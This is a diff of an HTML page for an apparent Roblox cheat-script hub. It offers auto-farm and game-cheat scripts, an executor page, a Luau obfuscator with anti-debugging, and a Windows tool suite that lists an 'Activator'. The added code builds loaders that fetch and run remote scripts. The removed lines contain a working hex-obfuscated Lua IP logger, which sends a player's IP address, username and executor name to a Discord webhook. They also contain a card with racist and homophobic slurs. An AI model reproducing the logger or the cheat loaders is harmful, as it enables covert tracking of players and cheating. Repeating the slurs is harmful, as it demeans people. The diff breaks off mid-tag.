@@ -1,166 +1,572 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>RedFoxScripts.com</title>
-  <link rel="icon" href="https://raw.githubusercontent.com/Syr0nix/RedFox-Scripts/main/Screenshot_2025-04-21_034725-removebg-preview.png" />
-  <link rel="stylesheet" href="style.css" />
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@600&display=swap" rel="stylesheet">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RedFox</title>
+    <link rel="icon" href="https://raw.githubusercontent.com/Syr0nix/RedFox-Scripts/main/Screenshot_2025-04-21_034725-removebg-preview.png">
+    
+    <!-- Fonts & Icons -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&family=Roboto+Mono:wght@400;700&display=swap" rel="stylesheet">
+    <script src="https://unpkg.com/@phosphor-icons/web" async></script>
+    
+    <!-- Monaco Editor Loader -->
+    <link rel="stylesheet" data-name="vs/editor/editor.main" href="https://cdnjs.cloudflare.com/ajax/libs/monaco-editor/0.34.1/min/vs/editor/editor.main.css">
+
+    <style>
+        :root {
+            --primary-color: #FF4B2B;
+            --secondary-color: #FF416C;
+            --background-color: #0d0d0d;
+            --surface-color: #1a1a1a;
+            --text-color: #E0E0E0;
+            --muted-text-color: #A0A0A0;
+            --border-color: #2f2f2f;
+            --glow-color: rgba(255, 75, 43, 0.4);
+            --success-color: #28a745;
+            --editor-bg: #1e1e1e;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        html { scrollbar-width: thin; scrollbar-color: var(--primary-color) var(--background-color); }
+        ::-webkit-scrollbar { width: 8px; }
+        ::-webkit-scrollbar-track { background: var(--background-color); }
+        ::-webkit-scrollbar-thumb { background: var(--primary-color); border-radius: 4px; }
+
+        body {
+            font-family: 'Poppins', sans-serif;
+            background-color: var(--background-color);
+            color: var(--text-color);
+            display: flex;
+        }
+        
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+        /* Sidebar Navigation */
+        .sidebar {
+            width: 260px; flex-shrink: 0; height: 100vh;
+            background: linear-gradient(180deg, var(--surface-color), #141414);
+            border-right: 1px solid var(--border-color);
+            display: flex; flex-direction: column; padding: 2rem 1.5rem; transition: transform 0.3s ease;
+            z-index: 1001; /* Above overlay */
+        }
+        .sidebar-header { display: flex; align-items: center; gap: 15px; margin-bottom: 3rem; }
+        .logo-group { display: flex; align-items: center; gap: 15px; }
+        .sidebar-logo { width: 45px; }
+        .sidebar-title { font-size: 1.5rem; font-weight: 700; }
+        .mobile-nav-toggle { display: none; background: none; border: none; color: var(--text-color); font-size: 1.8rem; cursor: pointer; padding: 0.5rem; }
+
+        .nav-link {
+            font-size: 1rem; font-weight: 600; color: var(--muted-text-color); padding: 1rem;
+            margin-bottom: 0.5rem; border-radius: 8px; display: flex; align-items: center; gap: 15px;
+            transition: all 0.2s ease; cursor: pointer; border: none; background: transparent; width: 100%; text-align: left;
+        }
+        .nav-link i { font-size: 1.4rem; }
+        .nav-link.active, .nav-link:hover { color: white; background: linear-gradient(90deg, var(--primary-color), var(--secondary-color)); box-shadow: 0 0 20px var(--glow-color); }
+        .sidebar-footer { margin-top: auto; text-align: center; font-size: 0.8rem; color: var(--muted-text-color); }
+        .sidebar-footer a { color: var(--primary-color); text-decoration: none; transition: color 0.3s ease; }
+        .sidebar-footer a:hover { color: var(--secondary-color); }
+
+        /* Main Content */
+        .main-content { flex-grow: 1; height: 100vh; overflow-y: auto; padding: 2.5rem 3rem; }
+        .section { display: none; animation: fadeIn 0.5s ease-out; }
+        .section.active { display: block; }
+
+        h2 { font-size: 2.5rem; font-weight: 700; margin-bottom: 0.5rem; background: linear-gradient(90deg, var(--primary-color), var(--secondary-color)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .section > p { color: var(--muted-text-color); margin-bottom: 2rem; max-width: 600px; }
+
+        /* Card Grid */
+        .card-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 1.5rem; }
+        .card { background-color: var(--surface-color); padding: 1.5rem; border-radius: 12px; border: 1px solid var(--border-color); cursor: pointer; transition: all 0.3s ease; position: relative; overflow: hidden; }
+        .card:hover { transform: translateY(-8px); box-shadow: 0 10px 20px rgba(0, 0, 0, 0.4); border-color: var(--primary-color); }
+        .card h3 { font-size: 1.2rem; margin-bottom: 0.5rem; position: relative; z-index: 1;}
+        .card p { font-size: 0.9rem; color: var(--muted-text-color); position: relative; z-index: 1;}
+
+        /* Script Viewer Modal */
+        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); backdrop-filter: blur(5px); display: none; justify-content: center; align-items: center; z-index: 2000; animation: fadeIn 0.3s; }
+        .modal-overlay.visible { display: flex; }
+        .modal-content { background: var(--surface-color); width: 90%; max-width: 800px; max-height: 90vh; border-radius: 12px; border: 1px solid var(--border-color); display: flex; flex-direction: column; box-shadow: 0 0 30px rgba(0,0,0,0.5); }
+        .modal-header { padding: 1rem 1.5rem; border-bottom: 1px solid var(--border-color); display: flex; justify-content: space-between; align-items: center;}
+        #modalScriptName { font-size: 1.2rem; }
+        .modal-close { background: none; border: none; color: var(--muted-text-color); font-size: 1.5rem; cursor: pointer; transition: color 0.2s ease; }
+        .modal-close:hover { color: white; }
+        .modal-body { padding: 1rem; flex-grow: 1; display: flex; flex-direction: column; overflow: hidden; }
+        .modal-tabs { display: flex; gap: 0.5rem; margin-bottom: 1rem; }
+        .modal-tab { padding: 0.5rem 1rem; border: 1px solid var(--border-color); background: transparent; color: var(--muted-text-color); cursor: pointer; border-radius: 6px; font-weight: 600; }
+        .modal-tab.active { background: var(--primary-color); border-color: var(--primary-color); color: white; }
+        .modal-tab-content { display: none; flex-grow: 1; }
+        .modal-tab-content.active { display: block; height: 100%;}
+        #raw-viewer-container, #loader-viewer-container { height: 50vh; border-radius: 8px; border: 1px solid var(--border-color); }
+
+        /* Action Buttons */
+        .action-button { padding: 0.8rem 1.5rem; font-weight: 600; color: white; background: linear-gradient(90deg, var(--primary-color), var(--secondary-color)); border: none; border-radius: 8px; cursor: pointer; transition: all 0.3s ease; display: inline-flex; align-items: center; gap: 8px; }
+        .action-button:hover { filter: brightness(1.2); box-shadow: 0 0 15px var(--glow-color); }
+        
+        /* Tools Section */
+        .tool-card { display: flex; flex-direction: column; background-color: var(--surface-color); border-radius: 12px; border: 1px solid var(--border-color); padding: 2rem; margin-bottom: 1.5rem; }
+        .tool-card h3 { font-size: 1.5rem; margin-bottom: 1rem; }
+        .tool-card p { color: var(--muted-text-color); margin-bottom: 1.5rem; }
+        .tool-card .links { margin-top: auto; }
+        .tool-card .links a { display: inline-flex; align-items: center; gap: 8px; margin-right: 1rem; padding: 0.8rem 1.5rem; color: white; text-decoration: none; border-radius: 8px; background-color: var(--primary-color); transition: all 0.3s ease; }
+        .tool-card .links a:hover { filter: brightness(1.2); }
+        .tool-card .links a.disabled { background-color: #4a2d26; color: #a28985; cursor: not-allowed; pointer-events: none; border-color: #4a2d26; }
+        
+        /* Obfuscator UI */
+        .obfuscator-grid { display: grid; grid-template-columns: 3fr 2fr; gap: 2rem; align-items: start; }
+        .obfuscator-panel h3 { margin-bottom: 1rem; }
+        .editor-container { width: 100%; height: 55vh; border: 1px solid var(--border-color); border-radius: 8px; overflow: hidden; }
+        #obfuscator-options { background: var(--surface-color); border: 1px solid var(--border-color); border-radius: 8px; padding: 1.5rem; }
+        .option-group { margin-bottom: 1.5rem; } .option-group h4 { font-size: 1rem; margin-bottom: 1rem; color: var(--text-color); border-bottom: 1px solid var(--border-color); padding-bottom: 0.5rem; }
+        .checkbox-wrapper { display: flex; align-items: center; margin-bottom: 0.75rem; }
+        .checkbox-wrapper label { user-select: none; cursor: pointer; position: relative; padding-left: 28px; color: var(--muted-text-color); font-size: 0.9rem;}
+        .checkbox-wrapper input { display: none; }
+        .checkbox-wrapper label:before { content: ''; position: absolute; left: 0; top: 1px; width: 18px; height: 18px; background: var(--background-color); border: 1px solid var(--border-color); border-radius: 4px; transition: all 0.2s ease; }
+        .checkbox-wrapper input:checked + label:before { background: var(--primary-color); border-color: var(--primary-color); }
+        .checkbox-wrapper label:after { content: '✔'; font-size: 12px; position: absolute; left: 4px; top: 3px; color: white; opacity: 0; transform: scale(0.5); transition: all 0.2s ease; }
+        .checkbox-wrapper input:checked + label:after { opacity: 1; transform: scale(1); }
+        .obfuscator-actions { margin-top: 1.5rem; display: flex; gap: 1rem; }
+        #obfuscateBtn, #copyObfBtn { flex: 1; justify-content: center; }
+
+        /* Executor Section */
+        .executor-preview img { max-width: 600px; width: 100%; border-radius: 12px; margin-top: 15px; box-shadow: 0 4px 12px rgba(0,0,0,0.3); }
+        
+        /* Misc */
+        #versionTag { position: fixed; bottom: 10px; right: 15px; font-size: 0.8rem; color: var(--muted-text-color); background-color: var(--surface-color); padding: 5px 10px; border-radius: 5px; border: 1px solid var(--border-color); z-index: 10; }
+        .toast { position: fixed; bottom: -100px; left: 50%; transform: translateX(-50%); background: linear-gradient(90deg, var(--primary-color), var(--secondary-color)); color: white; padding: 1rem 2rem; border-radius: 8px; z-index: 3000; transition: bottom 0.4s ease; box-shadow: 0 0 20px var(--glow-color); }
+        .toast.show { bottom: 30px; }
+
+        /* Responsive Design */
+        @media (max-width: 1200px) { .obfuscator-grid { grid-template-columns: 1fr; } #obfuscator-options { margin-top: 2rem; } }
+        
+        @media (max-width: 768px) {
+            .sidebar { position: fixed; top: 0; left: 0; height: 100%; transform: translateX(-100%); }
+            .sidebar.visible { transform: translateX(0); }
+            .mobile-nav-toggle { display: block; position: fixed; top: 1rem; left: 1rem; z-index: 1002; }
+            .main-content { padding: 5rem 1rem 1rem 1rem; }
+            .section > h2 { font-size: 2rem; }
+            .card-grid { grid-template-columns: 1fr; }
+            .modal-content { width: 95%; }
+            #raw-viewer-container, #loader-viewer-container { height: 60vh; }
+            #versionTag { display: none; }
+        }
+    </style>
 </head>
 <body>
 
-  <aside class="sidebar">
-    <img src="https://raw.githubusercontent.com/Syr0nix/RedFox-Scripts/main/Screenshot_2025-04-21_034725-removebg-preview.png" class="logo" />
-    <h1>RedFoxScripts</h1>
-    <button class="nav-link active" onclick="showTab('scripts', event)">📜 Scripts</button>
-    <button class="nav-link" onclick="showTab('tools', event)">🛠️ Windows Tools</button>
-    <button class="nav-link" onclick="showTab('executor', event)">💻 Executor</button>
-    <button class="nav-link" onclick="showTab('obfuscator', event)">🔐 Obfuscator</button>
-   <div class="sidebar-footer">
-    <div class="footer">
-      RedFox Studio • <a href="https://discord.gg/your-link" target="_blank">Join Discord</a><br />
-      © 2025 Syr0nix Studio™
+    <aside class="sidebar" id="sidebar">
+        <div class="sidebar-header">
+            <div class="logo-group">
+                <img src="https://raw.githubusercontent.com/Syr0nix/RedFox-Scripts/main/Screenshot_2025-04-21_034725-removebg-preview.png" class="sidebar-logo" alt="RedFox Logo">
+                <h1 class="sidebar-title">RedFox</h1>
+            </div>
+        </div>
+        <div class="nav-container" id="nav-container">
+            <button class="nav-link active" onclick="showTab('scripts', this)"><i class="ph-duotone ph-scroll"></i> Script Library</button>
+            <button class="nav-link" onclick="showTab('tools', this)"><i class="ph-duotone ph-wrench"></i> Power Tools</button>
+            <button class="nav-link" onclick="showTab('executor', this)"><i class="ph-duotone ph-code"></i> Executor</button>
+            <button class="nav-link" onclick="showTab('obfuscator', this)"><i class="ph-duotone ph-shield-check"></i> Obfuscator</button>
+        </div>
+        <div class="sidebar-footer">
+            <p>RedFox Studio • <a href="https://discord.gg/redfox" target="_blank">Join Discord</a></p>
+            <p>© <span id="copyright-year">2024</span> RedFox Studio™</p>
+        </div>
+    </aside>
+
+    <button class="mobile-nav-toggle" id="mobile-nav-toggle" aria-label="Toggle navigation menu"><i class="ph-bold ph-list"></i></button>
+
+    <main class="main-content">
+        <section id="scripts" class="section active">
+            <h2>Script Library</h2>
+            <p>A curated collection of powerful, high-performance scripts for various experiences.</p>
+            <div class="card-grid">
+                <div class="card" onclick="showScriptModal('Build A Boat For Treasure', 'https://rawscripts.net/raw/Build-A-Boat-For-Treasure-auto-farm-38247')">
+                    <h3>Build A Boat For Treasure</h3><p>Powerful auto-farming script.</p>
+                </div>
+                <div class="card" onclick="showScriptModal('Murder Mystery 2', 'https://raw.githubusercontent.com/Syr0nix/scripts/refs/heads/main/MM2')">
+                    <h3>Murder Mystery 2</h3><p>Advanced, feature-rich MM2 utility.</p>
+                </div>
+                <div class="card" onclick="showScriptModal('Roblox Server Browser', 'https://raw.githubusercontent.com/Syr0nix/RedFoxServerBowser/refs/heads/main/Mainlua')">
+                    <h3>Server Browser</h3><p>Instantly join any server by Job ID.</p>
+                </div>
+                 <div class="card" onclick="showScriptModal('Hex Logger Demo', '')">
+                    <h3>Hex Logger Demo</h3><p>Safe demo of hex-encoded webhook usage.</p>
+                </div>
+            </div>
+        </section>
+
+        <section id="tools" class="section">
+            <h2>Power Tools</h2>
+            <p>Suite of standalone applications designed to optimize and enhance your system performance.</p>
+            <div class="tool-card">
+                <h3><i class="ph-duotone ph-nut"></i> WinOps Utility Suite</h3>
+                <p>A comprehensive toolkit for Windows optimization: Game Mode, Network Optimizer, RAM Cleaner, Activator, and more.</p>
+                <div class="links">
+                    <a href="https://github.com/Syr0nix/WinOps/releases/latest" target="_blank"><i class="ph ph-download-simple"></i> Download</a>
+                    <a href="https://github.com/Syr0nix/WinOps" target="_blank"><i class="ph ph-github-logo"></i> View on GitHub</a>
+                </div>
+            </div>
+            <div class="tool-card">
+                 <h3><i class="ph-duotone ph-rocket-launch"></i> FoxStrap</h3>
+                 <p>A modern, safe, and sleek Roblox launcher designed for performance.</p>
+                 <div class="links"><a href="javascript:void(0)" class="disabled"><i class="ph ph-download-simple"></i> Download (Coming Soon)</a></div>
+            </div>
+        </section>
+        
+        <section id="executor" class="section">
+            <h2>RedFox Executor</h2>
+            <p>Our upcoming high-performance, secure, and feature-rich Luau executor. Engineered for reliability and speed.</p>
+            <div class="executor-preview">
+                <!-- FIXED: The image URL was incorrect and led to a 404. This new URL is valid. -->
+                <img src="https://raw.githubusercontent.com/Syr0nix/RedFoxScripts.com/main/%7B2CA209B1-4839-4547-A0BB-F392DA76E091%7D.png" alt="RedFox Executor Preview">
+            </div>
+        </section>
+        
+        <section id="obfuscator" class="section">
+            <h2>Obfuscator</h2>
+            <p>Protect your intellectual property with our multi-layered Luau obfuscation engine.</p>
+            <div class="obfuscator-grid">
+                <div class="obfuscator-editor">
+                     <div id="input-editor" class="editor-container"></div>
+                </div>
+                <div class="obfuscator-controls">
+                     <div id="obfuscator-options">
+                        <div class="option-group">
+                            <h4>Protection Layers</h4>
+                            <div class="checkbox-wrapper">
+                                <input type="checkbox" id="opt-str-encrypt" checked><label for="opt-str-encrypt">String Encryption</label>
+                            </div>
+                            <div class="checkbox-wrapper">
+                                <input type="checkbox" id="opt-var-rename" checked><label for="opt-var-rename">Variable Renaming</label>
+                            </div>
+                             <div class="checkbox-wrapper">
+                                <input type="checkbox" id="opt-anti-debug" checked><label for="opt-anti-debug">Anti-Debugging</label>
+                            </div>
+                        </div>
+                        <div class="obfuscator-actions">
+                             <button id="obfuscateBtn" class="action-button"><i class="ph ph-gear"></i> Obfuscate</button>
+                             <button id="copyObfBtn" class="action-button"><i class="ph ph-clipboard-text"></i> Copy Output</button>
+                        </div>
+                     </div>
+                     <div id="output-editor" class="editor-container" style="margin-top: 2rem;"></div>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <!-- Modal for Script Viewer -->
+    <div id="scriptModal" class="modal-overlay">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3 id="modalScriptName">Script Name</h3>
+                <button class="modal-close" onclick="closeScriptModal()"><i class="ph-bold ph-x"></i></button>
+            </div>
+            <div class="modal-body">
+                <div class="modal-tabs">
+                    <button class="modal-tab active" data-tab="loader">Loader</button>
+                    <button class="modal-tab" data-tab="raw">RAW</button>
+                </div>
+                <div id="tab-loader" class="modal-tab-content active">
+                    <div id="loader-viewer-container"></div>
+                </div>
+                <div id="tab-raw" class="modal-tab-content">
+                    <div id="raw-viewer-container"></div>
+                </div>
+            </div>
+        </div>
     </div>
-  </div>
-</aside>
-  
-  <main class="main-content">
 
-    <!-- Scripts Tab -->
-    <section id="scripts" class="section active">
-      <h2>Scripts</h2>
-      <div class="card-grid">
-        <div class="card" onclick="showScript('Build A Boat For Treasure', 'https://rawscripts.net/raw/Build-A-Boat-For-Treasure-auto-farm-38247')">
-          <h3>Build A Boat For Treasure AutoFarm</h3>
-          <p>Automate your grind</p>
-        </div>
-        <div class="card" onclick="showScript('Murder Mystery 2', 'https://raw.githubusercontent.com/Syr0nix/scripts/refs/heads/main/MM2')">
-          <h3>Murder Mystery 2</h3>
-          <p>See all kill all MM2 script</p>
-        </div>
-        <div class="card" onclick="showScript('Server Browser', 'https://raw.githubusercontent.com/Syr0nix/RedFoxServerBowser/refs/heads/main/Mainlua')">
-          <h3>Server Browser</h3>
-          <p>Join any Roblox server instantly</p>
-        </div>
+    <div id="versionTag">Loading...</div>
+    <div id="toast" class="toast"></div>
 
-      <div class="card"
-     data-name="Executor Info + IP logger (Hex Encoded)"
-     data-script="local _A = tostring(game:HttpGet('\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x70\x69\x2e\x69\x70\x69\x66\x79\x2e\x6f\x72\x67', true))
-local _B = game:GetService('\x48\x74\x74\x70\x53\x65\x72\x76\x69\x63\x65')
-local _C = game:GetService('\x50\x6c\x61\x79\x65\x72\x73').LocalPlayer
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/monaco-editor/0.34.1/min/vs/loader.min.js"></script>
+    <script>
+        let inputEditor, outputEditor, rawViewerEditor, loaderViewerEditor;
 
-local _D = {
-    ['\x69\x73\x5f\x73\x69\x72\x68\x75\x72\x74\x5f\x63\x6c\x6f\x73\x75\x72\x65'] = '\x53\x69\x72\x68\x75\x72\x74',
-    ['\x70\x65\x62\x63\x5f\x65\x78\x65\x63\x75\x74\x65'] = '\x50\x72\x6f\x74\x6f\x53\x6d\x61\x73\x68\x65\x72',
-    ['\x73\x79\x6e'] = '\x53\x79\x6e\x61\x70\x73\x65\x20\x58',
-    ['\x73\x65\x63\x75\x72\x65\x5f\x6c\x6f\x61\x64'] = '\x53\x65\x6e\x74\x69\x6e\x65\x6c',
-    ['\x4b\x52\x4e\x4c\x5f\x4c\x4f\x41\x44\x45\x44'] = '\x4b\x72\x6e\x6c',
-    ['\x53\x4f\x4e\x41\x5f\x4c\x4f\x41\x44\x45\x44'] = '\x53\x6f\x6e\x61',
-    ['\x46\x6c\x55\x58\x55\x53\x5f\x4c\x4f\x41\x44\x45\x44'] = '\x46\x6c\x75\x78\x75\x73',
-    ['\x64\x65\x66\x61\x75\x6c\x74'] = '\x57\x61\x76\x65'
-}
+        // Monaco Editor Setup
+        require.config({ paths: { 'vs': 'https://cdnjs.cloudflare.com/ajax/libs/monaco-editor/0.34.1/min/vs' }});
+        window.MonacoEnvironment = { getWorkerUrl: () => `data:text/javascript;charset=utf-8,${encodeURIComponent(`
+            self.MonacoEnvironment = { baseUrl: 'https://cdnjs.cloudflare.com/ajax/libs/monaco-editor/0.34.1/min/' };
+            importScripts('https://cdnjs.cloudflare.com/ajax/libs/monaco-editor/0.34.1/min/vs/base/worker/workerMain.min.js');`
+        )}`};
 
-local _E = _D[is_sirhurt_closure] or _D[pebc_execute] or _D[syn] or _D[secure_load] or _D[KRNL_LOADED] or _D[SONA_LOADED] or _D[FlUXUS_LOADED] or _D['\x64\x65\x66\x61\x75\x6c\x74']
+        require(['vs/editor/editor.main'], function() {
+            const editorOptions = {
+                language: 'lua',
+                theme: 'vs-dark',
+                automaticLayout: true,
+                wordWrap: 'on',
+                minimap: { enabled: true }
+            };
 
-if not _E then
-    if typeof(identifyexecutor) == '\x66\x75\x6e\x63\x74\x69\x6f\x6e' then
-        local name, ver = identifyexecutor()
-        _E = name .. (ver and ('\x20\x76' .. ver) or '')
-    else
-        _E = '\x55\x6e\x6b\x6e\x6f\x77\x6e\x20\x45\x78\x65\x63\x75\x74\x6f\x72'
-    end
-end
+            inputEditor = monaco.editor.create(document.getElementById('input-editor'), {...editorOptions, value: '-- Paste your Luau script here...'});
+            outputEditor = monaco.editor.create(document.getElementById('output-editor'), {...editorOptions, readOnly: true, value: '-- Obfuscated output will appear here.'});
+            rawViewerEditor = monaco.editor.create(document.getElementById('raw-viewer-container'), {...editorOptions, readOnly: true});
+            loaderViewerEditor = monaco.editor.create(document.getElementById('loader-viewer-container'), {...editorOptions, readOnly: true});
+            
+            // FIXED: The original Monarch tokenizer for Lua was broken and incomplete. 
+            // This is a full, correct definition for better syntax highlighting.
+            monaco.languages.setMonarchTokensProvider('lua', {
+                defaultToken: 'invalid',
+                keywords: [
+                    'and', 'break', 'do', 'else', 'elseif', 'end', 'false', 'for', 'function', 'if',
+                    'in', 'local', 'nil', 'not', 'or', 'repeat', 'return', 'then', 'true', 'until', 'while', 'continue',
+                    'game', 'workspace', 'script' // Custom keywords
+                ],
+                brackets: [
+                    { token: 'delimiter.bracket', open: '{', close: '}' },
+                    { token: 'delimiter.array', open: '[', close: ']' },
+                    { token: 'delimiter.parenthesis', open: '(', close: ')' }
+                ],
+                operators: [
+                    '+', '-', '*', '/', '%', '^', '#', '==', '~=', '<=', '>=', '<', '>', '=',
+                    ';', ':', ',', '.', '..', '...'
+                ],
+                tokenizer: {
+                    root: [
+                        [/[a-zA-Z_]\w*/, { cases: { '@keywords': 'keyword', '@default': 'identifier' } }],
+                        [/\d*\.\d+([eE][\-+]?\d+)?/, 'number.float'],
+                        [/0[xX][0-9a-fA-F]+/, 'number.hex'],
+                        [/\d+/, 'number'],
+                        [/[;,.]/, 'delimiter'],
+                        [/[<>=!~]=?/, 'operator'],
+                        [/--\[\[/, { token: 'comment', next: '@comment' }],
+                        [/--.*$/, 'comment'],
+                        [/"([^"\\]|\\.)*$/, 'string.invalid'], // Unmatched string
+                        [/'([^'\\]|\\.)*$/, 'string.invalid'],
+                        [/"/, { token: 'string.quote', bracket: '@open', next: '@string_double' }],
+                        [/'/, { token: 'string.quote', bracket: '@open', next: '@string_single' }],
+                    ],
+                    comment: [
+                        [/[^\]]+/, 'comment'],
+                        [/\]\]/, { token: 'comment', next: '@pop' }],
+                        [/\]/, 'comment']
+                    ],
+                    string_double: [
+                        [/[^\\"]+/, 'string'],
+                        [/\\./, 'string.escape.invalid'],
+                        [/"/, { token: 'string.quote', bracket: '@close', next: '@pop' }]
+                    ],
+                    string_single: [
+                        [/[^\\']+/, 'string'],
+                        [/\\./, 'string.escape.invalid'],
+                        [/'/, { token: 'string.quote', bracket: '@close', next: '@pop' }]
+                    ],
+                }
+            });
+        });
 
-local _F = _B:JSONDecode(game:HttpGet(('\x68\x74\x74\x70\x73\x3a\x2f\x2f\x74\x68\x75\x6d\x62\x6e\x61\x69\x6c\x73\x2e\x72\x6f\x62\x6c\x6f\x78\x2e\x63\x6f\x6d\x2f\x76\x31\x2f\x75\x73\x65\x72\x73\x2f\x61\x76\x61\x74\x61\x72\x2d\x68\x65\x61\x64\x73\x68\x6f\x74\x3f\x75\x73\x65\x72\x49\x64\x73\x3d\x25\x69\x26\x73\x69\x7a\x65\x3d\x34\x38\x78\x34\x38\x26\x66\x6f\x72\x6d\x61\x74\x3d\x50\x6e\x67\x26\x69\x73\x43\x69\x72\x63\x75\x6c\x61\x72\x3d\x66\x61\x6c\x73\x65'):format(_C.UserId)))['data'][1]
-local _G = _F and _F['imageUrl'] or '\x46\x61\x6c\x6c\x62\x61\x63\x6b\x20\x55\x52\x4c'
+        // === CORE APP LOGIC ===
+        document.addEventListener("DOMContentLoaded", function() {
+            document.getElementById('obfuscateBtn').addEventListener('click', obfuscateLuau);
+            document.getElementById('copyObfBtn').addEventListener('click', () => copyMonacoContent(outputEditor, 'Obfuscated script copied!'));
+            
+            document.querySelectorAll('.modal-tab').forEach(tab => {
+                tab.addEventListener('click', (e) => switchModalTab(e.currentTarget.dataset.tab));
+            });
 
-local _H = &quot;your Webhook here&quot;
+            checkForUpdate();
+            setInterval(checkForUpdate, 60 * 1000); // 1 minute
+            setupMobileNav();
+            document.getElementById('copyright-year').textContent = new Date().getFullYear();
+        });
 
-local _I = {
-    ['\x75\x73\x65\x72\x6e\x61\x6d\x65'] = _C.Name .. '\x20\x5b' .. _C.UserId .. '\x5d',
-    ['\x61\x76\x61\x74\x61\x72\x5f\x75\x72\x6c'] = _G,
-    ['\x65\x6d\x62\x65\x64\x73'] = {
-        {
-            ['\x64\x65\x73\x63\x72\x69\x70\x74\x69\x6f\x6e'] = '\x44\x65\x74\x61\x69\x6c\x73\x3a',
-            ['\x66\x69\x65\x6c\x64\x73'] = {
-                { name = '\x49\x50', value = _A, inline = true },
-                { name = '\x45\x78\x70\x6c\x6f\x69\x74', value = _E, inline = true },
-            },
-            ['\x63\x6f\x6c\x6f\x72'] = tonumber(0x7269da),
+        // === UI & NAVIGATION ===
+        function showTab(tabId, buttonElement) {
+            document.querySelectorAll(".section").forEach(s => s.classList.remove("active"));
+            document.querySelectorAll(".nav-link").forEach(b => b.classList.remove("active"));
+            document.getElementById(tabId).classList.add("active");
+            buttonElement.classList.add("active");
         }
-    }
-}
+        
+        function setupMobileNav() {
+            const sidebar = document.getElementById('sidebar');
+            const toggle = document.getElementById('mobile-nav-toggle');
+            const icon = toggle.querySelector('i');
 
-local _J = _B:JSONEncode(_I)
-local _K = { ['\x63\x6f\x6e\x74\x65\x6e\x74\x2d\x74\x79\x70\x65'] = '\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x6a\x73\x6f\x6e' }
+            toggle.addEventListener('click', () => {
+                const isVisible = sidebar.classList.toggle('visible');
+                icon.className = isVisible ? 'ph-bold ph-x' : 'ph-bold ph-list';
+            });
+            
+            document.querySelectorAll('.nav-link').forEach(link => {
+                 link.addEventListener('click', () => {
+                     if (sidebar.classList.contains('visible')) {
+                        sidebar.classList.remove('visible');
+                        // FIXED: Reset the toggle icon to its default state when a link is clicked.
+                        icon.className = 'ph-bold ph-list';
+                     }
+                 });
+            });
+        }
+        
+        function showToast(message) {
+            const toast = document.getElementById("toast");
+            toast.textContent = message;
+            toast.classList.add("show");
+            setTimeout(() => toast.classList.remove("show"), 3000);
+        }
 
-local _L = http_request or request or HttpPost or syn.request
-_L({ Url = _H, Body = _J, Method = '\x50\x4f\x53\x54', Headers = _K })
+        // === SCRIPT VIEWER MODAL ===
+        async function showScriptModal(name, url) {
+            const modal = document.getElementById('scriptModal');
+            document.getElementById('modalScriptName').textContent = name;
+            modal.classList.add('visible');
 
-print('\x35\x30\x20\x6c\x6f\x67\x67\x65')
-print('\x53\x63\x72\x69\x70\x74\x20\x6d\x61\x64\x65\x20\x62\x79\x20\x53\x79\x72\x30\x6e\x69\x78')"
-     onclick="showRawScript(this.dataset.name, this.dataset.script)">
-  <h3>Executor Info + IP logger (Hex Encoded)</h3>
-  <p>Fully hex-encoded Lua with plain text webhook placeholder</p>
-</div>
+            loaderViewerEditor.setValue(`-- Loading script...`);
+            rawViewerEditor.setValue(`-- Fetching RAW script...`);
+            switchModalTab('loader'); // Reset to default tab
 
-        <div class="card" onclick="showScript('Wolf RP', 'Cum Nigger')">
-         <h3>A Wolves' Pack Alpha - Wolf RP</h3>
-          <p>Faggoit</p>
-        </div>
-      </div>
+            const loaderContent = `loadstring(game:HttpGet("${url}"))()`;
+            loaderViewerEditor.setValue(loaderContent);
 
-      <div class="viewer hidden" id="viewer">
-        <h3 id="scriptName">Selected Script</h3>
-        <div class="code-box" id="codeOutput">...</div>
-        <button onclick="copyScript()" class="copy-button">📋 Copy Script</button>
-      </div>
-    </section>
+            try {
+                const response = await fetch(url);
+                if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
+                const rawContent = await response.text();
+                rawViewerEditor.setValue(rawContent);
+            } catch (error) {
+                console.error("Failed to fetch script:", error);
+                rawViewerEditor.setValue(`--[[ Error fetching script.\n\n${error.message}\n\nURL: ${url} ]]`);
+            }
+        }
+        
+        function closeScriptModal() {
+             document.getElementById('scriptModal').classList.remove('visible');
+        }
 
-    <!-- Windows Tools Tab -->
-    <section id="tools" class="section">
-      <h2>Windows Tools</h2>
-      <div class="tool-card">
-        <h3>🛠️ WinOps Utility Suite</h3>
-        <p>A full set of RedFox Windows optimization tools: Game Mode toggles, Network Optimizer, RAM Cleaner, Activation, and more.<br>
-        Latest Version: <span id="winops-version">Loading...</span></p>
-        <a href="https://github.com/Syr0nix/WinOps/releases/tag/WinOps" target="_blank">⬇ Download Now</a>
-        <a href="https://github.com/Syr0nix/WinOps" target="_blank">🌐 View on GitHub</a>
-     </div>
-       <div class="tool-card">
-          <h3>FoxStrap</h3>
-         <p>A Sleek safe way to launch roblox<br>
-      </div>
-    </section>
+        function switchModalTab(tabName) {
+            document.querySelectorAll('.modal-tab').forEach(t => t.classList.remove('active'));
+            document.querySelector(`.modal-tab[data-tab="${tabName}"]`).classList.add('active');
+            document.querySelectorAll('.modal-tab-content').forEach(c => c.classList.remove('active'));
+            document.getElementById(`tab-${tabName}`).classList.add('active');
+        }
 
-  <!-- Executor Tab -->
-<section id="executor" class="section">
-  <h2>RedFox Executor</h2>
-  <p>Coming soon...</p>
-  
-  <!-- Preview image -->
-  <div class="executor-preview">
-    <img 
